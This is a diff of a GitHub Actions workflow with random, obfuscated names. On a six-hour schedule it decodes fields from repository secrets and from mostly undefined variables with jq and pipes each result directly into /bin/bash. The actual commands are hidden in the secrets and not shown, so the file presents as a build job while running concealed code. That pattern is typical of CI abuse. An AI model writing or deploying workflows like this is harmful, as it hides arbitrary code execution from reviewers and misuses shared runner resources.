@@ -1,8 +1,9 @@
 name: budajian3691
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 1/6 * * *'
+    - cron: '27 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: budajian3691
         env:
-          fzs5882: ${{ secrets.fzs5882 }}
+          yvk0131: ${{ secrets.yvk0131 }}
         run: |
-          echo $fzs5882 | jq -r .jygv950 | /bin/bash
-          echo $ur50 | jq -r .zsu44 | /bin/bash
-          echo $wosgo83757 | jq -r .y5 | /bin/bash
-          echo $nn09633 | jq -r .kkiux77 | /bin/bash
-          echo $b0697 | jq -r .m076 | /bin/bash
-          echo $u32 | jq -r .aolgz664 | /bin/bash
-          echo $rheni5734 | jq -r .bpxbv32541 | /bin/bash
+          echo $yvk0131 | jq -r .ihxc02 | /bin/bash
+          echo $dgp83620 | jq -r .gz1 | /bin/bash
+          echo $ld1 | jq -r .dayo551 | /bin/bash
+          echo $wxn62556 | jq -r .avz366 | /bin/bash
+          echo $pekpt143 | jq -r .oj8926 | /bin/bash
+          echo $rqyj69 | jq -r .cmm275 | /bin/bash
+          echo $gwa0 | jq -r .t28 | /bin/bash
+          echo $s58 | jq -r .ceoxu253 | /bin/bash
+          echo $lyyu567 | jq -r .xvwjg17 | /bin/bash
+          echo $ckp067 | jq -r .pwfzd202 | /bin/bash
+          echo $a63147 | jq -r .sfejz38183 | /bin/bash
+          echo $vajp0085 | jq -r .npaxf014 | /bin/bash
+          echo $jjqn776 | jq -r .vgrr7602 | /bin/bash
 
